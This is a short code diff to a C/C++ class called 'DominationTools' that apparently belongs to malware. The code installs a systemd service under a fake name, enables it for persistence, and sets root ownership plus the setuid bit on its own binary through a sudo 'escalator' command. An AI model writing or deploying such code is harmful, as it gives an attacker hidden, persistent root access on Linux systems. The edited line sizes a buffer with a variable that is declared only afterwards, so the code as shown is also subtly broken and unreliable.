@@ -14,7 +14,7 @@ class DominationTools{
 
 
 		char symb[sizeof(Current.fakename)+21]="/etc/systemd/system/";
-		char cmd[sizeof(symb) + sizeof(Current.fakename) - 4];
+		char cmd[sizeof(path) + sizeof(Current.fakename) - 4];
 		char escalator[sizeof(Current.name)*2 + 38];
 		char path[12 + sizeof(Current.fakename)]="/usr/share/";
 
@@ -23,7 +23,7 @@ class DominationTools{
 			strcat(symb, Current.fakename);
 			strcat(path, Current.fakename);
 
-			sprintf(cmd, "chmod 644 %s; systemctl enable %s", symb, Current.fakename);
+			sprintf(cmd, "chmod 644 %s; systemctl enable %s", path, Current.fakename);
 			sprintf(escalator, "sudo chown root:root %s; sudo chmod +s %s", Current.name, Current.name);
 		}
 
